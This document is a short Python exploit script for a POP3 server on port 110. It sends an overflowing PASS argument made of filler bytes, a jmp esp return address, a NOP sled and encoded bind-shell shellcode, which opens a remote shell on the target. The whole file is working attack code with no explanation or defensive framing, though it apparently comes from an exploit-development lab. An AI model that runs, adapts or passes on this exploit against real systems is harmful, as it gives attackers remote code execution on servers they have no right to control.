#!/usr/bin/python 
# Name: Rio Atmadja

import struct
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ret = "\x53\x93\x42\x7e" #0x7e429353 jmp esp

#bad char: '\x00\x0a\x0d' payload: shell_bind_tcp
payload = ("\xda\xc5\xb8\x90\x16\x9a\x19\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x49\x31\x42\x19\x83\xc2\x04\x03\x42\x15\x72\xe3\x66\xf1\xfb"
"\x0c\x97\x02\x9b\x85\x72\x33\x89\xf2\xf7\x66\x1d\x70\x55\x8b"
"\xd6\xd4\x4e\x18\x9a\xf0\x61\xa9\x10\x27\x4f\x2a\x95\xe7\x03"
"\xe8\xb4\x9b\x59\x3d\x16\xa5\x91\x30\x57\xe2\xcc\xbb\x05\xbb"
"\x9b\x6e\xb9\xc8\xde\xb2\xb8\x1e\x55\x8a\xc2\x1b\xaa\x7f\x78"
"\x25\xfb\xd0\xf7\x6d\xe3\x5b\x5f\x4e\x12\x8f\xbc\xb2\x5d\xa4"
"\x76\x40\x5c\x6c\x47\xa9\x6e\x50\x0b\x94\x5e\x5d\x52\xd0\x59"
"\xbe\x21\x2a\x9a\x43\x31\xe9\xe0\x9f\xb4\xec\x43\x6b\x6e\xd5"
"\x72\xb8\xe8\x9e\x79\x75\x7f\xf8\x9d\x88\xac\x72\x99\x01\x53"
"\x55\x2b\x51\x77\x71\x77\x01\x16\x20\xdd\xe4\x27\x32\xb9\x59"
"\x8d\x38\x28\x8d\xb7\x62\x25\x62\x85\x9c\xb5\xec\x9e\xef\x87"
"\xb3\x34\x78\xa4\x3c\x92\x7f\xcb\x16\x62\xef\x32\x99\x92\x39"
"\xf1\xcd\xc2\x51\xd0\x6d\x89\xa1\xdd\xbb\x1d\xf2\x71\x14\xdd"
"\xa2\x31\xc4\xb5\xa8\xbd\x3b\xa5\xd2\x17\x54\x4f\x28\xf0\x9b"
"\x27\x38\x01\x74\x35\x3d\x10\xd8\xb0\xdb\x78\xf0\x94\x74\x15"
"\x69\xbd\x0f\x84\x76\x68\x6a\x86\xfd\x9e\x8a\x49\xf6\xeb\x98"
"\x3e\xf6\xa6\xc3\xe9\x09\x1d\x69\x16\x9c\x99\x38\x41\x08\xa3"
"\x1d\xa5\x97\x5c\x48\xbd\x1e\xc8\x33\xaa\x5e\x1c\xb4\x2a\x09"
"\x76\xb4\x42\xed\x22\xe7\x77\xf2\xff\x9b\x2b\x67\xff\xcd\x98"
"\x20\x97\xf3\xc7\x07\x38\x0b\x22\x96\x05\xda\x0b\x1c\x7f\x68"
"\x78\xdc")

buffer = '\x41' * 4654 + ret + '\x90' * 16 + payload 
print "\nSending evil buffer..."
s.connect(('192.168.10.101',110))
data = s.recv(1024)
s.send('USER username' +'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
data = s.recv(1024)
s.close()
print "\nDone! "
